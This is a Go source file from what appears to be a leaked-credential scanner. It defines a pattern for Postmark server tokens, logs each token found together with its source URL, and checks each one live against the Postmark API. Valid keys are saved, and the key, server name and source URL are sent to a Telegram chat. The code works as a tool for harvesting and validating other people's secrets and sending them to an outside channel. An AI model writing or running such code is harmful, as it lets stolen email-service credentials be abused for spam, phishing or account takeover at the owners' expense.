package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"time"
)

var postmarkPattern = regexp.MustCompile(`(?i)(?:postmark[_-]?(?:server[_-]?)?token|POSTMARK_API_TOKEN)["'\s:=]+([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})`)

func (a *AWSScanner) CheckPostmark(key, sourceURL string) bool {
	if !a.Config.APIValidation.Postmark {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "postmark_found.txt")

	req, err := http.NewRequest("GET", "https://api.postmarkapp.com/server", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Accept", "application/json")
	req.Header.Set("X-Postmark-Server-Token", key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	req = req.WithContext(ctx)

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false
	}

	var res map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&res)
	serverName, _ := res["Name"].(string)

	a.logValid("Postmark", fmt.Sprintf("Key: %s | Server: %s", key, serverName))
	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_postmark.txt")
	a.storeValidKeyLimit("Postmark", key, serverName)

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := a.tgHit("📧", "POSTMARK", sourceURL) + fmt.Sprintf(
		"Key : %s\nServer : %s\n", key, serverName)
	go a.sendTelegram(msg)
	return true
}
